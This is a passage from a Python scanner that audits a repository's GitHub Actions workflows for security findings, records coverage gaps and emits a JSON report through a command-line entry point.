                    "pattern": entry.pattern,
                    "severity": entry.severity,
                    "match_text": hit.match_text,
                }
                try:
                    title = entry.title_template.format(**fmt_vars)
                except (KeyError, IndexError) as e:
                    logger.warning(
                        "Pattern %s has bad title_template %r: %s",
                        entry.pattern,
                        entry.title_template,
                        e,
                    )
                    title = f"{entry.pattern} hit in {basename}"

                findings.append({
                    "id": f"f{finding_seq}",
                    "pattern": entry.pattern,
                    "severity": entry.severity,
                    "title": title,
                    "workflow_file": rel,
                    "line": hit.line,
                    "affected_jobs": hit_jobs,
                    # Present only when the job list is a fallback rather than
                    # an attribution; report.py renders it beside the jobs.
                    **({"affected_jobs_note": jobs_note} if jobs_note else {}),
                    "workflow_activity": activity,
                    "evidence": hit.evidence,
                    # Optional second claim, always rendered as derived: the
                    # condition elsewhere in the job that makes the quoted
                    # line a finding (see RawHit.derived_note). Absent for
                    # every detector that has only one claim to make.
                    **({"derived_note": hit.derived_note}
                       if hit.derived_note else {}),
                    # Says whether `evidence` quotes the file or states a
                    # claim this scanner derived from it; the report renders
                    # the two differently so a derived sentence is never
                    # dressed as source the reader can go and find.
                    "evidence_kind": "derived" if hit.derived else "source",
                    "fix_strategy": entry.fix_strategy,
                    "fix_recipe_anchor": entry.anchor,
                    # `risk` and `risk_note` are deliberately absent.
                    # The orchestrator scores them per group against
                    # the actual workflow code (SKILL.md Phase 2.5)
                    # and patches them onto each finding before piping
                    # the JSON to report.py.
                    #
                    # Transient, stripped by `_dedupe_occurrences`: the exact
                    # text that matched, so two DIFFERENT sinks on one line
                    # collapse into one occurrence that names both rather than
                    # one that silently names only the first.
                    "_match_text": hit.match_text,
                })

    findings = _dedupe_occurrences(findings)

    # Coverage-gap surface: a workflow that can't be read or parsed yields
    # nothing from the detectors, which is indistinguishable from "scanned
    # clean". Probe each file once and record the failures so report.py can
    # surface them loudly — a skipped file must never read as a clean one.
    scan_incomplete: list[dict[str, str]] = []
    for wf in workflow_files:
        reason = _probe_scannability(wf)
        if reason is not None:
            rel = str(wf.relative_to(root))
            logger.warning("coverage gap: %s — %s", rel, reason)
            scan_incomplete.append({"workflow_file": rel, "reason": reason})
    # A match a detector found but could not anchor to a line is a coverage gap
    # too — but a DIFFERENT one, kept in its own list. See `_DROPPED_MATCHES`:
    # the file here read and parsed fine, so its config facts are perfectly
    # measurable; only one `run:` step went unscanned.
    dropped_matches: list[dict[str, str]] = []
    for dropped in _DROPPED_MATCHES:
        rel = _repo_relative(dropped["file"], root)
        logger.warning("unscanned run: step: %s — %s", rel, dropped["reason"])
        entry = {"workflow_file": rel, "reason": dropped["reason"]}
        if entry not in dropped_matches:
            dropped_matches.append(entry)

    logger.debug(
        "scan complete: %d findings, %d coverage gap(s), %d dropped match(es)",
        len(findings), len(scan_incomplete), len(dropped_matches),
    )
    _total_s = time.monotonic() - _t_scan_start
    logger.debug(
        "Timing: scan_total=%.1fs activity_enrich=%.1fs (concurrent) over %d workflow(s)",
        _total_s, _enrich_s, len(workflow_files),
    )
    return {
        "scanned_at": _dt.datetime.now(_dt.timezone.utc)
        .isoformat(timespec="seconds")
        .replace("+00:00", "Z"),
        "scanned_workflows": len(workflow_files),
        "repo_root": str(root),
        "repo": repo,
        "commit_sha": _git_commit_sha(root),
        # True when the audited checkout had uncommitted/untracked changes at
        # scan time — the scanned bytes then are not the bytes at `commit_sha`,
        # and the report says so on its audited-commit row.
        "repo_tree_dirty": _repo_tree_dirty(root),
        "skill_commit_sha": _skill_commit_sha(),
        # True when the skill's tracked source had uncommitted edits at scan
        # time — so `skill_commit_sha` alone may not reflect the code that ran.
        # report.py marks the recorded commit `-dirty` so provenance is honest.
        "skill_tree_dirty": _skill_tree_dirty(),
        # Per-phase wall-clock so a slow run shows WHERE the time went
        # (Tier-0 timing). The orchestrator folds these into its Phase 6
        # `Timing:` summary.
        "timings": {
            "run_start_epoch": round(_scan_start_epoch, 3),
            "activity_enrich_s": round(_enrich_s, 2),
            "scan_total_s": round(_total_s, 2),
        },
        "gh_checks": gh_checks,
        "gh_check_details": gh_check_details,
        # Every catalog pattern this scan actually evaluated. A chain that
        # failed to load would otherwise be indistinguishable from a chain
        # that found nothing; verify_report.py compares this set against the
        # ten-vector manifest so a silently-shrunk catalog goes red.
        "catalog_patterns_evaluated": sorted(e.pattern for e in catalog),
        "findings": findings,
        # Workflow files that couldn't be read or YAML-parsed, so the static
        # detectors never ran on them. Always set (empty when every file
        # scanned) so report.py can rely on the key. Non-empty means the
        # report's "clean" verdict has holes — see report.py's gap banner.
        "scan_incomplete": scan_incomplete,
        # `run:` steps a detector could not anchor to a raw line and therefore
        # never scanned for injection sinks. A separate channel from
        # `scan_incomplete` on purpose: the FILE parsed fine, so its config
        # facts stay measurable, while coverage still degrades to PARTIAL and
        # the report names the step count and the file count honestly.
        "dropped_matches": dropped_matches,
        # The config facts + the security component of the CI Score
        # (ci-secure owns this number; the ten vectors above stay
        # findings-only and never enter it). Unscannable workflows force
        # every workflow-scoped fact to UNMEASURED, never a silent pass — but
        # a merely unanchored `run:` step does not: the file parsed, so the
        # facts about it are real.
        #
        # **The AGGREGATE here is machine-only and is deliberately never
        # rendered to a reader** — a deliberate design choice. The block's
        # CONTRACT is unchanged because ci-advisor blends from it: same keys,
        # same `fact_id`s, same `outcome`s, same `score`/`passed`/
        # `scored_count`/`applicable_count`/`unmeasured`/`constants`/
        # `registered`. Only human-readable prose inside it moved (a `fact`
        # sentence and the crash-path `reason`, both of which the report
        # PRINTS and so had to stop referring to a score) — so it is
        # shape-compatible, not byte-identical. Bind to the ids, not the
        # prose. `report.py`
        # renders the FACTS as a `## 🧰 Config hygiene checks — pass/fail`
        # table and no number at all. A hygiene aggregate labelled "Security
        # score" overclaims what six config observations can say and collides
        # with the vector scan printed beside it — an early run read "5 of 6
        # facts pass" above ten green rows as a contradiction.
        #
        # This exact back-and-forth has already happened ONCE, in the other
        # direction: a review restored the rendered score on the argument that
        # "a score computed but not shown is a number the reader cannot
        # check". That argument is answered, not overlooked — the number is
        # not shown to the reader because it is not FOR the reader.
        # `tests/verify_report.py::check_no_rendered_security_score` makes the
        # invisibility an invariant. Do not "fix" it again.
        "security_score": _compute_security_score(root, workflow_files,
                                                  scan_incomplete),
    }


def _compute_security_score(
    root: Path, workflow_files: list[Path],
    scan_incomplete: list[dict[str, str]],
) -> dict[str, Any]:
    """Isolated so a facts-layer crash degrades to an honest 'unmeasured'
    block instead of taking down the whole scan (the vectors are the product's
    core; the score must never be the reason a scan dies)."""
    try:
        import config_facts
        return config_facts.compute_config_facts(root, workflow_files,
                                                 scan_incomplete)
    except Exception as exc:                                  # noqa: BLE001
        logger.warning("security_score unavailable: %r", exc)
        # Same key set as facts_to_score, so a consumer never has to branch on
        # which path produced the block — a `constants` KeyError that fires
        # only on the failure path is the worst place to discover the gap.
        return {"facts": [], "score": None, "passed": 0, "scored_count": 0,
                "applicable_count": 0, "unmeasured": [],
                "constants": {"rule": "100 * passed / scored; pass/fail only, "
                                      "no weights, no partial credit"},
                # `reason` is READER-VISIBLE: report.py prints it in the
                # "Nothing here was checked" headline whenever `facts` is
                # empty, which is exactly this path. So it must not talk about
                # a score — the report renders none by design, and "this is NOT a score of 100" in a report with no score
                # is the removed contract leaking back at the reader.
                "reason": f"config-facts layer failed: {exc!r} — no config "
                          "fact could be checked", "registered": None}


def _default_catalog_path() -> Path:
    return _THIS_DIR.parent / "references" / "security-patterns.md"


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description="Scan a repo's GitHub Actions workflows for security findings.",
    )
    parser.add_argument(
        "--catalog",
        type=Path,
        default=_default_catalog_path(),
        help="Path to security-patterns.md (default: bundled catalog).",
    )
    parser.add_argument(
        "--root",
        type=Path,
        default=Path.cwd(),
        help="Repo root to scan (default: cwd).",
    )
    parser.add_argument(
        "--repo",
        type=str,
        default=None,
        help="owner/repo to enrich findings with workflow activity (optional).",
    )
    parser.add_argument(
        "--gh-impostor",
        choices=["auto", "on", "off"],
        default="auto",
        help=(
            "The P14.11 impostor-SHA check needs the GitHub API. auto "
            "(default): run iff gh is authenticated; on: require it (error "
            "if gh unavailable); off: skip (recorded loudly in gh_checks)."
        ),
    )
    args = parser.parse_args(argv)

    root = args.root.resolve()
    if not (root / ".github" / "workflows").is_dir():
        print(
            f"ERROR: no .github/workflows directory under {root}",
            file=sys.stderr,
        )
        return 1

    if args.repo:
        # Validate the format up front so a malformed value (e.g. a full URL,
        # an `owner` with no slash, or a `git@github.com:owner/repo.git`
        # remote) surfaces as an error instead of silently dropping activity
        # enrichment on every finding.
        from gh_utils import validate_repo_format  # noqa: E402
        ok, err = validate_repo_format(args.repo)
        if not ok:
            print(f"ERROR: --repo: {err}", file=sys.stderr)
            return 2

    try:
        catalog = load_catalog(args.catalog)
    except (FileNotFoundError, ValueError) as e:
        print(
            f"ERROR: the pattern catalog is broken — {e}\n"
            f"       This is a COVERAGE FAILURE, not a clean scan: the "
            f"affected chain would never be evaluated. Reinstall the skill "
            f"(or fix {args.catalog}) and re-run.",
            file=sys.stderr,
        )
        return 1

    gh_skip_reason = _DEFAULT_GH_SKIP_REASON
    if args.gh_impostor == "on":
        from gh_utils import check_prereqs  # noqa: E402
        if not check_prereqs():
            print(
                "ERROR: --gh-impostor=on but gh is not authenticated "
                "(gh auth login)",
                file=sys.stderr,
            )
            return 2
        gh_impostor = True
    elif args.gh_impostor == "auto":
        from gh_utils import check_prereqs  # noqa: E402
        gh_impostor = check_prereqs()
    else:
        gh_impostor = False
        gh_skip_reason = "disabled via --gh-impostor=off"

    try:
        result = scan(
            catalog, root, repo=args.repo, gh_impostor=gh_impostor,
            gh_skip_reason=gh_skip_reason,
        )
    except CoverageError as e:
        print(f"ERROR: coverage failure — {e}", file=sys.stderr)
        return 1
    json.dump(result, sys.stdout, indent=2)
    sys.stdout.write("\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
